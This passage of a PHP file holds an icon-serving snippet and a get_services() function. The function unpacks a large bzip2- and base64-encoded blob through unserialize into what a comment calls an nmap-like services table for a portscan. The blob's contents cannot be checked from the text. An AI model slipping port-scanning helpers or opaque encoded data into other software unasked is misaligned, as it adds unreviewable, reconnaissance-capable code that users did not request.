		case 'plus': $img = base64_decode('R0lGODlhCQAJAPQAACkpKTIyMj8/P0NDQ1VVVWdnZ2tra3d3d35+fo6OjpOTk5iYmJ6enqSkpKmpqa+vr7Ozs7a2try8vNTU1ODg4OXl5ebm5unp6e/v7/Ly8vX19fb29vf39/v7+/z8/P///yH5BAgAAAAALAAAAAAJAAkAAAU74BSNZDRBX6p+0PNxHAJ/j9NlmfFlndNohwJhENA0GBiLR+DxfBiLC4UC2FAuC0VlW+lsFZKEeJyQhAAAOw=='); break ;
		default: die('wrong image');
	}
	//header('Content-Type: image/gif');
	echo $img;
}

// Get nmap-like services array
function get_services()
{
	// nmap-services equivalent table, used for portscan
	$services = 
	'QlpoNDFBWSZTWb4sy/0AGvbfgEAAEAN/+D+n3EC////6YCSaAAAfQKeeQNw+vDtuqdvXS3dqR3Zubb2O4TGkCKgqIp3DA5QCqvnz'.
	'6u2qElJArWQgpRUPoMoK7ahNaqFUiqiGsVKhUGpggAIE0TRCmjU0PUA9TTaaINT0DIqlNQAA0AAAAACKeTUYjJAGgGgNBk0aDTCA'.
	'1PCBVBKnqeiAAAAAAAEmpGhFU2mUNAAAAAAACREAgjQjRKn6FAyAAGgNFAx6BpGxkLge556q5ZXiGiQR6eoskPp2l5fY4EAxlCrK'.
	'gXDRJjBle+F3vZD2/VMR2z/Z5LiJP5lxBkCQMTMv6uiStDnmlKzj/Scyx/9WkaSMWumCokSAkToRzBQp1mVcixAmBHs5haF0mHxJ'.
	'37ZSWx9eC6b3K+YFFf7EZFLO3zkSaDhtHZKFMhBTVjqX1E/Nj9GYg3pU7q+3Zjg86XmMi87Ncqz8VehFLeAfmxapwUfiLj1UypRj'.
	'L9tWtSNVBInC6tv5/H+X5eoQvTzYVbz9deXIzo/LIOpih03e+ymG8sgrSPMscmZ0c7DEJS7krH5+rQ+Sxlmh8fayRpj4th4hoxEr'.
	'NXX08I8s8fbrIo8vFFofrxn7dmyvmhaJi5f9FrfalZdV4rb7EeEYKO9pNvZ0JfiiJOPsuT89efv+T/FdEVPF22S6liGkCR+MK8lj'.
	'8c+QXj/0pcccdKqqqquuBDVtzuWRB7d/QlreMfj34EBWEPW/izyg8smFbtlkcxWljhHUznEF96xl+TKQL7rbUJ40d+4n1ea5y8JO'.
	'+cwJoKo4H2enUTmpzpTRjYK/Etz8zlyvg5S57shyO5k/gvHdrPg78CWbWosGf9SXZ8xON6hpSpDi3E0z6xRdHe0qdZygvOW5ZpRE'.
	'hbMVINx3BKnRBQ+bjieB1hhOcGQVhkXMRt1PrnqNt8m978xmQTW5JqIi/vv8e/y+udc1XlNsbjoReg+7I4TXnoMPPCyhW8JH6Cj5'.
	'KhSe4VKWMCkYmzxdE9kAwsUqRZzdviSJkd/JP+oZLYx6Sn0IbfuXWNBqCO6zNt1y0Sgc37xi9S5OO795HP7GRPIHFAJXmPo8leCZ'.
	'hhq/ZZhDoI948wAEP4X05Y1iWiuNu/PEOyL06pNM/Vv3AkkARQp351zzq9liCHsyhXqqm9khNHWdcNLcGINIuVWjY49BwShCFn5K'.
	'/KBoTI+ifJKCetQM5ZW2DmUSCMwrGMYJIMP4IE+WoPESqFjxNShTRZ3mdpDxecRplyucof74DTJ3FI8xlxd94neeN1hKT1rbxS0N'.
	'AhDqEaMJvo357XUllarzmc366rBn96ao1reuR0cMQuS4+wwa8R83Eg0n7bPleFxCcH1UPnsx5L8xr9G+tERFLHi6L09MNgENSGvH'.
	'l4Pvr2pjTTbMzWlJIQsBcztj5fq8P3Wl40NPVDQx/JFpd/4g91vIE1Xff3+fnfUB3z3E/x4D+SWKcqqhTCZTusWMEli3jKcU5iJT'.
	'8fxuIed+jUAfOUYIjn8v8/xmWf59tapW7tPVuXnUG1C2oGnqaatT2ApubW3Lm2XjD9xxTFBDvR+Ts+rbO7oUUrUzA9hGNHVukWCj'.
	'EbJzdV4d2wXYw0QRcQQSZz1swGdNYpDlbCOEEkg8bTzQlbXRHkq1WvI7EAjTPa5L9tay9dkUZYkQyksQdkkm8KBBEzNd3fmDD03b'.
	'GahCjmWkGiexONAXBs3bvUOzWSMN9srw96yPeAEvyXJCt5XVGnNjvVLRqPMWULfUlevCNQnTO2QKoXZGPVyx2arTgzYUZEQroPiM'.
	'PlpQJy1NpyRySV0jRpMHxZDej/P+mxDJcle2R/LS2fAgE/M2e6IlLnmPHUzLFDhi1TM0abFSkylMzLYS6MEC71nq7dJmXFo19/+Z'.
	'LPLNYmSKTKR6YJKwjrVt23vTMXtXNN+rXYNpbNaZhmmkgma4cKdcZuUeHDQBZpJNiSMTzms0rm0IDaF15sSKQWQwgVqpKQFJxCSZ'.
	'1e60xFedsIIYjDEQ0Is0Cm+qZrXELLAKn3jaFZCjUPeR8FjnHVcsAHzEEEnx6PamdBQ3lZswdPoiCQAJIcK3N0B4AX6e4SSOIToj'.
	'NEX8bF6NahOUWImIJjVQoTuSbVbsGMZuzM6RBGXG0T13ZNnt0hgxRESzi8lfBjN82OUiJmPi9/05QX8Gft48c/jmH3IdfR21X9+/'.
	'8mCrEffuEHxMCA+hnv5+7Y+6xbFepSKNE+JJvFjDwIg7ADww1VTAxahd36ZSN3sdXoq81BMaHN38vGpNdcrHCt5zDtAVFZE3gt0P'.
	'BHugPw99y0I2zvZQUUVYnMSges75e6pIoCyRQOYL3RrHW8nm126xvKGSeyIvpz9hrbiMz4EWYhjlIrG4ioDBFlTFT1sTorGsVnIk'.
	'VCXnmp2vVuM21Ylfidq8ffn48Ax9y7/zjvjxF3z4ij/IcDUDjqRBCBAZQwmfR65grrmqSXp0esbvMQtAKtu6K5setrQMBASxzA5V'.
	'Ei2ljJEWGPBdkggkhRTFY2exeLzeRFRRVRrG8TLA4lOnwU0MCbsIg6RAIJURZTqGH+uhhJILHjKqiqb1TmlYkViIqMiogKqJIqIg'.
	'ILGMRCKKRgwUbf2t+F1XUXBiExIZeMVfxx3r+2/dOW5cX3Xdk3nxy1FVVbd0kCRjy2qxrSrYhzRLjJ5h6PZJHFkJP0dyPtB3eu2x'.
	'pSqQqdky9VUGREHLSieGPSfHGG7GKKqiovKlLq65jacxC/yKIIJBBJyLLheXEUWmYmwSQojpHOGx3VBi1GNeTMQ7yUsUTG+wSI0A'.
	'yCSQRqSQQZMTv1RwkG0gCSIcQzDGa1IEEkgnNyXkVueXiSCaVnV3nG73qr0orEVXF7NYu9VKRSCoikVYKKCxGLAQVIxixiCKxGRE'.
	'RIIMSMigMTfO67NdcrrkEya6EqciqMvtMB4InQ92puNNQ0kyAmZpSZDaEHyVEZSjGIRRJoLibV48PXzg/ubssOZ8M5jiq8mosRW/'.
	'N422bry1rxzyZdj52mIqiDnjvp6svXNucKvv1QrF23rWcJ0hBAgrCI4wSCWst4hkBEEHwcRECEikTIMmpUkiCfIj0hqNzKp+Hyfe'.
	'ar0ngEEyjlUANuTFuzEfe4H0PgZY7awgnEFEYIwFFiqRVkgskYCQfeJ8BN/TRORMM1zqtUSy+x6qV4NGA1ZgUt4jVLdDlbkiB1Qb'.
	'jELXSacvJzN/O7/qgRfEDG2NkM3vqszxvSsbXAHa18Us3duj4g43EDLxZTZiPMhRL+WHbQg5R0JEsPfPfEewSFbWYcQMwJyRA9JZ'.
	'iSYNox6MpkZZGKgZv5YzlJp2FBwaxmdkCo1rHLvrvvJ2goEUUJIsJE1nVdb5dVXdsnwi2tN2ysmzL2EFbGVT0ceeoIruL6qqZeJS'.
	'Xt6unvr7/P8838AkkkkEkohfhth/hMDvuifq6+6yOUyQdX43WTV4Q/HCLsiqs07XtZcx6ndkAF7lOkfCovIT8FiKizgld56zjHOX'.
	'vSoqqs5rvq7ZXKcUvffOcvjNc71d4ZTJFICySAoSs767Tq1FXF6qpWocrFzeRNLOjZ7phCGZozj4qRFmqJB6po6r1wVGrSK3dW6a'.
	'+XxJHrJILMeDe8D8PIt3iwLwPrWcswwcjcWZDK6VWdmsR7g+YUnZuN1ESUzdtXRFHYg0LtdxXlcTDSq51t64EqSACfeAHt6ypJi+'.
	'V70dW5eTNvJUGLYTxkRS1LS6m5Zx5GjptrMRD3p47h2lmknqxx02X9/dfV/SFuSMk/KXmRv1fzqoq34D9eK5UunW1dcKbuoUPpfY'.
	'e3AzeEQuUpUXhVSRLevDKzGUJEY0hKYJShCU9Vc0aJFokokEkEGtWSUvS1G4S6jytyd37UAAHtPvDaF2xX1Vdy+BltZUusiWfLj7'.
	'tmpnjlNi3Tq6qNW2okRhzmFaRqur3R12DfX807nxGKK3q2RXhZAJyeN5toap1hm9gQCTAh+xHRQSCC3RuekTsoucwlTjk0Ms5pEo'.
	'3JuQdfgheVgQIyiCJu27tpVnJIsKTui1QQcpOUYU3eZMirrchUUhEa9ytfl45jozdF9XaKFuCPJYKEqV6Q0mzl8hz9ZW3F1Q3tAh'.
	'IUYER69QuXhvgl3URcMWaabrC5OybdCHIs26grQtYoVrj2OxXqNvdQhcrxI1n1DBatHV3pupAt+AWadCe7M1Y7A2liAFS+DfR8ti'.
	'xDGtG+xs3liLtxmwC1npuYxX5aDIy3d69pU8CmcTLtTu7IrtA7rlG/SnGRbsUTbF3OC2PDcNCd8o2j4St3xHt9WmhUqCSRIxJ2Db'.
	'tbiq5FOaTLxs4Lzw1ehOivWcF4nah0xhyJpMTkAznpCLfqUOoZgpG8FpiAioLAdmlZosNaaFJ1IKjczNNWqRFF3VOaqF0Byunwym'.
	'8y0Mq79nUMvWMt5ORwnp6VafmYiVcVSj4BgHH7cclCVMO9q/HzGLG0qsRkous0167wzCzJjcMG2A62huMUvdfDEa1TaoUy3s2lXB'.
	'bJMe0W69WegFR8w3ky7wU6WMDCKjKOkzMmZz+iQj+VnKQCYIYhJoQxIEIAkkEhIMAiQIwIkgwZIggCMCKYQJKZAgg0yEhQQg0hIS'.
	'pJCVUAkWSUECVQBCoEkqiECpJJGkkCpCEqoQlSEI34AAAeAGY++NK+7ajRVIr5s1Rs19KreuIfbgx93HeKuDZvEi6IW9tbhXUyHT'.
	'TVp31VTHCbS512k8+a1XpVUIjRUrkJUmEq4+Zbu1TuSsqjT2+y7l8aVdo4XokqlTs70roDyNIi5j3q3OV3doiCNZVb0ey6eTa57e'.
	'K8Lut5tM7Tu7iXH9suKCmHVm4kzMdh7N7arXhoZzrsMTseWy0pylUDOp3XGpUtzsuc19r3RnRzFXlxi0q4ulcYPxmPoqS1uByuCs'.
	'Osp4SL3N10pfQhuKRFDLWbeFRoN1WuSoKDFBypbt1U7uQtgEKNSqppJn0B1SvSUjFbu496Y17kLsKq4upzpUyYVAnx4rKBy6Naxq'.
	'v1RjmAddkZOTqvMWA4mTlPYYKgiquYjVIUy4E5LRWmaPZburruRytyJjhrbfQrSNYxalmroVl1m+w4tsRqWxsWy70WjW5FsZOQjc'.
	'uPZDndYpmLSsrCFjuabtc0KjsMbPY+88mOh7FDRKhiDl3uw1UUFmF4L4OOF24+tQ0sM7Y27q7t7fC8fYOEiZYOJsi2ozaSsOw07i'.
	'jVbio3iq7q7cppVe00pZrH6XlzKCWJPnqs7VFc7r4aGLHK6Rl3kVhCxbFRiSSPKLwuC4nFeC4eVVu3iraOx3cs4aa3FNyw6+f6/8'.
	'R+lv9b/YLaXbBjrtU+6kJgJYnQBOg1VTUW1pAHM00sYjrFzqgtw4kFgkoWcg4iSqIO3I2AUqGsfaHg33pkmuE0EZKAUn0uPWX+0W'.
	'T/C9UjGmSbaaBB/4tIjYgj7IwMOH7FvwA06f9mLDaCEK4t1ATi6Jrc2GxATe64NiDtjGEfKDcRcZ42gFvazhcPk6mDcGdytrWz3+'.
	'KnFgUPZ1KocDGkClmvc7SiMIhYuYlyQhOLadJ17npszevF8mv4WXSLs2aJcojvrO1CuxxJl8aIoZUKmaH5/CJSsvxQUcX5T5OzS4'.
	'kB8V4N5+ofoa1/21o9FzjoSLBODCeE1Ab3Fq4yosbqoQhw4cJvExb1Le/fbaFydf/W+fxfZku28sozBsKrT8RTbTPMHS6wdnV5P4'.
	'gznQvvIneW6Qf04C79Xy7f9iEqntd8QPTEFCkPPkRv4K4Hq8Z/78YJL8MqtUuGvE4Fc4g5EcTvVAcHOLp0WCAdkIUxU/5ubGg/3e'.
	'OCtoRtdRh7qlOmzhXAsKxWCv9Vlj45hJKgYLnHFwxokUJH0gloSJAgN7nGtYM9p8szlbsgef0JgEW8DuVSvPCRcNycA+98wB7bud'.
	'dPU4NN1JFhRmm4akxItpbTGzlkeM7ooZONkWO0WZGJc0Zc3HFb0pniN70yN0ut9+Kaja3qoRMYzzDZhwmmTtKF8MJfvELtAOSV2w'.
	'uVeAjynHtJB3TwDFzC0mjnJI80cYX2R0kYqpkCdQzPed52Hksb7oIEPBIRcmJA2pXvEbtZjjmt/BWGdeslZ9XpinGfOmkWcgy0/m'.
	'UoBHGpxIFXY6pO5hqeUEKptUlxwUhncSjCImm0bPOxH7TB1RciTwzmMSMlMkCh6uhuxK/ifc9FOXGj406VrdMpfmCRu8x3Z23hZz'.
	'Aedykijl8KXTjD4gs1ZSmojXaxz31Ywfkgh6hew9AcFaQUmIjQYoiCpgcxqr38jILDm8sABhCpUggKRcF5ydytOD7t2beIiPj9VS'.
	'wkIEW3CSZTSR68BJtIqg10xV6zpbg3n8IYDzPZA8tV+Ee+QhKmCW1XlOTTjY/e6xeV30ZjKdYnZ8hEoSoDRZZiFaLjMicbxZB2NS'.
	'/qEdfzAE4ok4kMFIlj1z35fwe10wADbkau5yNfrilIPjc7glIWlyggmyBlM4OMkybmEognqqrO0tfMKa/kvRWMnc8ZnnOrdyEZM9'.
	'dSzURXn3sjFt3AbhSOb4DleCcIQ1HQlS7n6AqTdkOGoCpPaTfg/PP5SiWfaAIL/I/uH6KM8EvyIYLQHHNYUSU+VAg8SA8ixOm7jH'.
	'KS4lijjAJjNupAIvCHjzOTswAvzfzy99UPNLIW0xiS3hL1qE4pDikm5SPl3oUYBgYI+gIULj6lCn0wMNYYAd2djRuegcG0bjcLID'.
	'MHHNoM4DAXwBO3NO7jJMt7nuI2vArBSEyxDp5+R6MXh5s0ZMf90soqTE4BHnDZgYcmjPnCc6YEmaWtkPDhGBlI/klwBUEIXsZ3Rz'.
	'sAiGPplcU6zdn34N77ZGFiGZoGl8Aw2uCa7ZvU72Q+d4oqBe+vzQhm9Fpwgu63mjxmAiuO3BfNzTLOw7CkvxSdeZxf3VU74jaDy2'.
	'8NEPomP0sEgV2rA85fckvmlpwjraaX1tRj7zV1KYVAsUqjtP5uFLQi8c48rhWbaaUlVaUX7nXqo8+ZIeO/8f4gAID8eOA+QLw+IS'.
	'feN37HyCVgewSGYBzwPDm2fB1O52FAkaRtABmpOVIfL4wNt7edkKPqdXfvX3qz1nqkFfwR3p2SH68m6wwczWvPn7PPW27ZeUjjqE'.
	'LPqh1db2v9pjbblgwCkZl5HP1uzO4bpSE8++NhgdCYgnmQ2QFMxshRDXwqw7/UM9ImPheV23te/z6mlBmt37fa0OI6YHIGbd/vPG'.
	'3v6Mk19c7lToHEMq0rOrFxNqL3vBJ82msA8KpTNfvvgO9a/sfM65+JlL0pSihB3kHBb6V8mIGALjHMg8Co3/UHqB+EBhFNiJ9Xaa'.
	'imq77arM0cyFOxahes43nDRhr1XB694s6PzGnBTAckkm/7eXQgma7s8IzBoIaktzUgb8zgUMlAh3SIr2EHX4pSdwb+EmtsqVRzMc'.
	'LTcqXFvfl7/uYdwWZTfoeCYcI0enyEDCu40y4zrdYjDiKW+WvQzBWhQ6q69Ge7ZwCSgCl8nYBFfQrjU4RE8XMpRe/Xle/pvB5xVF'.
	'nVXiPCQ9CE4k8kQO9Fvlkx0TAc28utzXaBPcxvX0Tw+C8tFgcx40YtgO3jK/IK6jiPpCu8TUC0e+IdgXjme6pMl43RwQqkA4yYg5'.
	'1pGYuW/MJJSOLzuFNw2I5UQebbOaXqcSYr9XWOSNHpoxhLgiBEROfqA4BPTA32IeTg56nzDLwHvfkx4G3Mltd+p8sFetHKUx5qjg'.
	'zNubhzEE8LPoUS7WC7o6MvvCFao38XQt57TfYnqItHjOHEbiMNYnoau4gg1eZkghfH7R88HzberZRG24wxQ9P6F4HceOaiF93hZF'.
	'LTetcdPpwajlpihOFA4tvExUhNt/EUleT4pWpMVOCnnNPDWuw9HSw1SYpM98kSmW5+J1zmQG0Nt6jt8wacdDCD2138uD8dp1vret'.
	'EQ+fBmvfzN+R+6saWsCtFSXLlrW0Qiak1iFC3NVqsZpnnXY4O9p4+r2eyQTqPTXDRhpB2GY8yjQFCILcQQynRI4NwrwCIkNUtpWQ'.
	'QE+yCqTdChukFYHiYivSiNInxZX66G6q1IHEHzYx2C0FnxeCeoXZSUqOgn5JAn0Jkch9rh/YP5ZnmMIPkh+gQRn2B1TLovpjXUdc'.
	'q94g5oM1gsjlI0LLi8OvDdyfJiBF8nSx6qS39wtmzvipapW69RmMfrj1XSuimdMFoiFhwMuvJilzBDHQYcPdv5ycX5pVFxAtgk3B'.
	'2ngG8j9uHB9QoOu15pbxpnmtRVDbfxxUP3PteAv89llh5Nqt8yGwu/cKVtVGXxUVuVBERy1gsuJfxEfA7zbhAY/Sez/HpR34cNze'.
	'Ar5pKtmWyDo/Hv9MIos5gMEN2Xvr7rX6ub24ChV9yEGGj5jTdydaDgwS5HkGT7b924iGgCK0IiZKTZgKraznkCIyQwj1jd7RlNHk'.
	'+B1TFOKQg4mWuljCkUqjmfeMfMr8T36L1MNL7+HlO5acofVD6f6XV4T5J0PgRMEQUwVSLjrg+1ft6FhF3zuVaBMRGkuVCDllNomx'.
	'9zwpjqa2/Q0WWVDivyVamua4ln8PFshQI3HygEiLNTcNhazaiGBdu2lY8B9vWMDixgVzKXD4KeP1jrCMY34jewfDF2xw7weYInlp'.
	'HxMff6G4IJHtKDOHAY8zvq8REqEEvqDhvlDg5mDHQugvs/bvTWjNJv+s7DsCZcfy47hFBxWsJGdoUNHy4aUYcDaCRlnLQpaIgKnq'.
	'KcxD8RC8AyHw1TyUqU3meFv64/uobTY/FIHqu3Qeyi3Ru5e69W8TIu17NqkG9YIc53Ile3eCIpDoPqYgBWX1I9xzR9I0wzIARNXO'.
	'upMXAq6UhLdEBQNf22rsZqXpc/b/HYlOirAHjhhjteY9+7ZMvGYYxikMlCBhQr0LqhthHXlvzAfFRvigDAPmdCcRALfrfntCRDB/'.
	'WqVtOwTaTac0KZDHFCwjBaERMO0UlZid4WBsG2MaYmArOEWUcbG8MUqW2UdL0QkmZx8PgXeZUXzRXrVE3BQ2Skjel805SaRrNl+u'.
	'UqCO7eV7tuM56hHGxQz6m8WK07870xFhS76K7oeJxq8p++tc/czMyEq22neNDMLqj4wbhNqDNd7/F6aHxubzshYv2py1LW166+a6'.
	'48aEcf0oAEAJOntNpXppMQ9iNfaUUPQBSdBsKi7GkfSPR7SFZoDBs5iOvrPnnHi92oMKClTwzce1reNW9I/ajOUbzS6gybbJxe38'.
	'd/GtnvB8NseUMi4bS+78lPYvFzsUV5IO0OZzd+gp5qxhXvz87cWO2zhbnskk7/eSlnW4md6KY3e+LLvYOfTKVrJIGd5kkaONRy+V'.
	'iL1pTlVrCgQM47XNvXNyJy2a+p2MPseUkQKBO3AK5M/CVE4yMbYkigc/wPpG1mbvlTkYMat02CYv8WyUg8EGcJUEVf91otJB8LTR'.
	'Vc8sNUjgvfIKKl20KsbAICQnDyQcthW2WFUZxp1I3QfBHGs9zrVplDxe7V8cTabZLEpIiPToomznQ0rRIirfpzima/Ofqz4+ey/d'.
	'81g+bMCFYAJjn3jrU08goUQJGbh5orOwTpqetO33hKE8QsyIU/Bue6ColAiWuzNaPz6vXvntOYI7cSzamN4AifVM+GRSrO45nC74'.
	'LTp93ZWrzcp5ajjm0FFiVpRHHCbZ41W2MPVxgRDMe1LLknf1BEo+axpmELZg5IQpXYkJ11oY4QZuJxrJ9Knugqlpu11hpeztF2/N'.
	'GpjPb1o4g6dOYhsBts61zql7Q6hFuHlka8kYF42chWkNBb4B0DM+cpLs/CSlEZepUXpznWry4TsoEbwEwAO5iO9xmiYqAYHg2jhs'.
	'H28Cel0KtdbuILUfPsqoPW/okXbHfnrqkmAwSnc10HCiHjFcXq8hQEQkHHwaP0IXIQWYONAG3nMoL2NU6z6uMjhIknK7IpSyPLSl'.
	'h0/OxzIx7U+WMYyYMTIYotrM4t48EzGs4MOdslUIeRxbw7lKK6i0QXQmcUjznBJ243lBfFY/N72DdVxGLEW689/z5l9CNSEdcN0Z'.
	'MK8L65KlfIZ/CuwYhQnkJEAvHpQGnUwYlt9v57dXn7A3pezum8iCemkRSIM/rmfrx8S8OF+90nN4U0QR6Yt5KeqS/mADj1f4lPye'.
	'zIEKZBIG6RBYKiTg72NFzA7vcOWNzBpQkjBw6+ahJDDCyOLQdsU/3/H/4u5IpwoSF8WZf6A=';

	return unserialize(bzdecompress(base64_decode($services)));
}
?>

